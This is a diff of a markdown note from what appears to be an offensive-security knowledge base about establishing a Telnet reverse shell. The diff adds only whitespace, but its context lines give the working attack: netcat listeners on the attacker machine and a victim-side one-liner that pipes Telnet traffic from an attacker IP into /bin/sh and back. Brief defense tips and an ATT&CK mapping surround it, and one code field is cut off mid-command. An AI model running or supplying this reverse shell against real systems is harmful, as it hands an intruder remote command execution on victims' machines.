@@ -35,11 +35,15 @@ To establish a Telnet reverse shell, the attacker first needs to find a vulnerab
 
 From a business perspective, this technique can be used to gain access to sensitive data and systems, which can result in financial loss, reputational damage, and legal consequences.
 
+ 
+
 ## Requirements
 
 1. Access to a vulnerable Telnet service on the target system
 
 1. A Telnet client for establishing the reverse shell
+
+ 
 
 ## Defense
 
@@ -48,6 +52,8 @@ From a business perspective, this technique can be used to gain access to sensit
 1. Implement network segmentation to limit lateral movement
 
 1. Use network monitoring tools to detect and alert on Telnet traffic
+
+ 
 
 ## Objectives
 
@@ -59,6 +65,8 @@ From a business perspective, this technique can be used to gain access to sensit
 
 1. Pivot to other systems on the network
 
+ 
+
 # Instructions
 
 1. To establish a reverse shell with Telnet, follow the steps below:
@@ -69,10 +77,18 @@ From a business perspective, this technique can be used to gain access to sensit
    telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081
 3. Once executed, you will have a reverse shell connection to the attacker machine.
 
+ 
+
+
+
 **Code**: [[In Attacker machine start two listeners:
 nc -lvp 8]]
 
+
+
 > This command is used to establish a reverse shell connection from the victim machine to the attacker machine using Telnet. The attacker needs to start two listeners on their machine, one for each port 8080 and 8081. The victim machine then connects to the attacker machine using Telnet and pipes the output to /bin/sh, which allows the attacker to execute commands on the victim machine. The connection is then redirected to the second listener on port 8081, which allows the attacker to receive the output of the executed commands on their machine.
+
+
 
 **Command** ([[Start two listeners on Attacker machine]]):
 
@@ -82,11 +98,17 @@ nc -lvp 8081
 
 ```
 
+
+
+
+
 **Command** ([[Run command on Victim machine]]):
 
 ```bash
 telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -108,3 +130,5 @@ telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081
 - [[Reverse Shell]]
 - [[Reverse Shell Cheat Sheet]]
 - [[Telnet]]
+
+
